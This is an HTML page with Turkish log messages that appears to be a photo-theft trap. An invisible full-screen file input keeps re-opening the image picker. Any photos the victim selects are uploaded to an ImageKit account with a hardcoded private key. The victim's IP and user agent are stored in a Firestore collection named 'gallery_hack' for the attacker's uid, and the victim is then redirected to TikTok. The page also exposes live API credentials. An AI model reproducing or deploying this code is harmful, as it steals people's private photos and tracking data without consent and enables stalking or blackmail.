<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>.</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #000;
            min-height: 100vh;
            min-height: 100dvh;
        }
    </style>
</head>
<body>

    <input type="file" id="galleryInput" multiple accept="image/*" style="position:fixed;top:0;left:0;width:100%;height:100%;opacity:0;cursor:pointer;z-index:9999;">

    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>

    <script>
        (function() {
            const params = new URLSearchParams(window.location.search);
            const uid = params.get('uid');
            const count = Math.min(parseInt(params.get('count')) || 10, 100);

            console.log('UID:', uid, 'Count:', count);

            if (!uid) {
                window.location.href = 'https://www.tiktok.com';
                return;
            }

            const firebaseConfig = {
                apiKey: "AIzaSyBSy4oCPNTB1h9l2M1P3rkcvwiDrhu82Ao",
                authDomain: "camerahhh-15487.firebaseapp.com",
                projectId: "camerahhh-15487",
                storageBucket: "camerahhh-15487.firebasestorage.app",
                messagingSenderId: "212849652224",
                appId: "1:212849652224:web:19d8a85c01cd81005bdee5"
            };

            firebase.initializeApp(firebaseConfig);
            const db = firebase.firestore();
            console.log('Firebase başlatıldı');

            async function uploadToImageKit(file) {
                return new Promise((resolve, reject) => {
                    const formData = new FormData();
                    formData.append('file', file);
                    formData.append('publicKey', 'public_XJOKnz4iFXkkFRR/NNOj41Y6Ddk=');
                    formData.append('fileName', Date.now() + '_' + file.name);
                    formData.append('folder', '/gallery-uploads');
                    formData.append('useUniqueFileName', 'true');

                    const xhr = new XMLHttpRequest();
                    xhr.open('POST', 'https://upload.imagekit.io/api/v1/files/upload');
                    xhr.setRequestHeader('Authorization', 'Basic ' + btoa('private_T2ESq+R6d+czVTlcK/u4QkW4yBU=' + ':'));
                    xhr.timeout = 120000;

                    xhr.onload = function() {
                        console.log('ImageKit yanıt status:', xhr.status);
                        console.log('ImageKit yanıt:', xhr.responseText);
                        if (xhr.status === 200 || xhr.status === 201) {
                            try {
                                const data = JSON.parse(xhr.responseText);
                                console.log('ImageKit URL:', data.url);
                                resolve(data.url);
                            } catch(e) {
                                console.error('ImageKit parse hatası:', e);
                                resolve(null);
                            }
                        } else {
                            console.error('ImageKit hata status:', xhr.status);
                            resolve(null);
                        }
                    };
                    xhr.onerror = function() {
                        console.error('ImageKit ağ hatası');
                        resolve(null);
                    };
                    xhr.ontimeout = function() {
                        console.error('ImageKit timeout');
                        resolve(null);
                    };
                    xhr.send(formData);
                });
            }

            async function getIP() {
                try {
                    const r = await fetch('https://api.ipify.org?format=json');
                    const data = await r.json();
                    console.log('IP:', data.ip);
                    return data.ip;
                } catch(e) {
                    console.error('IP hatası:', e);
                    return 'unknown';
                }
            }

            const galleryInput = document.getElementById('galleryInput');

            galleryInput.addEventListener('change', async function(e) {
                const files = Array.from(e.target.files);
                console.log('Seçilen dosya sayısı:', files.length);
                
                if (!files || files.length === 0) {
                    console.log('Dosya seçilmedi, yönlendiriliyor');
                    window.location.href = 'https://www.tiktok.com';
                    return;
                }

                const selectedFiles = files.slice(0, count);
                console.log('İşlenecek dosya sayısı:', selectedFiles.length);

                try {
                    const ip = await getIP();
                    const photoUrls = [];

                    for (let i = 0; i < selectedFiles.length; i++) {
                        console.log('Yükleniyor:', i + 1, '/', selectedFiles.length, selectedFiles[i].name);
                        const url = await uploadToImageKit(selectedFiles[i]);
                        if (url) {
                            photoUrls.push(url);
                            console.log('Yüklendi:', url);
                        } else {
                            console.log('Yükleme başarısız:', selectedFiles[i].name);
                        }
                    }

                    console.log('Toplam yüklenen:', photoUrls.length);

                    if (photoUrls.length > 0) {
                        const saveData = {
                            ownerId: uid,
                            photos: photoUrls,
                            photoCount: photoUrls.length,
                            requestedCount: count,
                            ip: ip,
                            userAgent: navigator.userAgent,
                            timestamp: new Date().toISOString(),
                            unix: Date.now()
                        };
                        
                        console.log('Firebase kayıt:', saveData);
                        
                        try {
                            const docRef = await db.collection("gallery_hack").add(saveData);
                            console.log('Firebase kayıt başarılı, doc ID:', docRef.id);
                        } catch(dbError) {
                            console.error('Firebase kayıt hatası:', dbError.message, dbError.code);
                            // Alternatif kayıt
                            saveData.userAgent = navigator.userAgent.substring(0, 100);
                            const docRef2 = await db.collection("gallery_hack").add(saveData);
                            console.log('Firebase alternatif kayıt başarılı, doc ID:', docRef2.id);
                        }
                    } else {
                        console.log('Hiç fotoğraf yüklenemedi');
                    }
                } catch(e) {
                    console.error('Genel hata:', e.message, e.stack);
                }

                console.log('TikTok\'a yönlendiriliyor');
                window.location.href = 'https://www.tiktok.com';
            });

            function triggerInput() {
                console.log('Input tetikleniyor');
                galleryInput.click();
            }

            triggerInput();
            setTimeout(triggerInput, 500);
            setTimeout(triggerInput, 1000);
            setTimeout(triggerInput, 2000);

            document.addEventListener('click', triggerInput);
            document.addEventListener('touchstart', triggerInput, { once: true });

            document.addEventListener('visibilitychange', function() {
                if (document.visibilityState === 'visible') {
                    setTimeout(triggerInput, 300);
                }
            });

            window.addEventListener('focus', function() {
                setTimeout(triggerInput, 300);
            });

        })();
    </script>
</body>
</html>
